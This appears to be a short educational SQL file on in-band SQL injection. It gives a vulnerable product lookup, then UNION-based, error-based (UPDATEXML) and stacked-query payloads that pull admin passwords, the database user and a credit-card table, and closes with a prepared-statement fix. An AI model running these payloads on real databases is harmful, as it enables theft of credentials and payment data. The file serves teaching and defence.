-- In-Band SQL Injection
-- In-band (classic) injection: data is returned directly in the same channel used
-- to submit the query, making it the easiest type to exploit and detect.

-- Vulnerable application query
SELECT product_name FROM products WHERE code = 'P100';

-- UNION-based in-band exfiltration in the same response channel
SELECT product_name FROM products WHERE code = 'P100' UNION SELECT password FROM admins;

-- Error-based in-band leak: the database error is echoed back to the user
SELECT product_name FROM products WHERE code = 'P100' AND UPDATEXML(1, CONCAT(0x7e, (SELECT USER()), 0x7e), 1);

-- In-band data through stacked query results returned over the same connection
SELECT product_name FROM products WHERE code = 'P100'; SELECT * FROM credit_cards;

-- Prevention: prepared statements and display of only validated output
SELECT product_name FROM products WHERE code = ?;